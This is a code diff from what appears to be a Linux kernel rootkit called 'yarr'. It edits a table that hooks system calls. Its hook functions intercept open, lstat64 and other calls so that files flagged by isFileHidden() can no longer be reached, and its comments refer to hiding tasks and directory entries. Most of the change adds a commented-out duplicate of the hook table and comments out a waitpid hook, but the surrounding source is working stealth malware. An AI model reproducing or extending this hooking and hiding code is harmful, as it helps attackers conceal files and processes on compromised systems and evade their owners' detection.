@@ -46,6 +46,12 @@
 // TODO: When accessing a file inside a hidden directory instead of "no such
 // file" message we are getting "is a directory" message. Debug and fix.
 
+// TODO: Review all system calls to ensure if we implement all those that we
+// need.
+// List of missing syscalls:
+//	- sys_getdents
+//	- sys_fstat64
+
 /*
  * Here we declare all the system calls that we will capture. This array has
  * as many positions as syscalls are in the kernel. Each position has NULL or
@@ -56,6 +62,361 @@
  * position with the address of your hook function. Take care, you will suffer
  * if you change a wrong NULL xDD.
  */
+
+/*
+void *syscalls_hooks[NR_syscalls] = {
+	NULL, // 0
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	yarr_open,
+	NULL,
+	NULL,//yarr_waitpid, // Buggy, check commentaries.
+	NULL,
+	NULL,
+	NULL, // 10
+	NULL,//yarr_execve,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,	// TODO: Not really sure if this is sys_ni_syscall().
+	NULL,
+	NULL, // 20
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 25
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 35
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 45
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 50
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 55
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 60
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 65
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 70
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 75
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 80
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 90
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 95
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 100
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 105
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 110
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,//yarr_wait4,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 120
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 125
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 130
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 135
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 140
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 145
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 150
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 160
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 165
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 170
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 175
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 180
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 190
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,//yarr_stat64,
+	yarr_lstat64,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 200
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 205
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 210
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 215
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,//yarr_getdents64,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 225
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 240
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 245
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 250
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 255
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 260
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 265
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 275
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 280
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 285
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 310
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 315
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 325
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 330
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL,
+	NULL, // 345
+	NULL,
+	NULL
+};
+*/
+
 void *syscalls_hooks[NR_syscalls] = {
 	NULL, // 0
 	NULL,
@@ -429,6 +790,8 @@ asmlinkage long yarr_open(const char __user *filename, int flags, int mode) {
 
 	if (!isFileHidden(filename))
 		ret = sys_open(filename, flags, mode);
+//	else
+//		debug("Task %s tried to access file %s\n", current->comm, filename);
 
 	return ret;
 }
@@ -445,13 +808,13 @@ asmlinkage long yarr_open(const char __user *filename, int flags, int mode) {
 // yarr_waitpid it will incur in this bug too... right now I don't care :D.
 
 // TODO: Check if the task is hidden.
-asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options) {
+/*asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options) {
 	asmlinkage long (*sys_waitpid)(pid_t, int __user *, int);
 
 	// debug("yarr_waitpid() called.\n");
 	sys_waitpid = sys_call_table_backup[__NR_waitpid];
 	return sys_waitpid(pid, stat_addr, options);
-}
+}*/
 
 asmlinkage long yarr_creat(const char __user *filename, int mode) {
 	asmlinkage long (*sys_creat)(const char __user *, int);
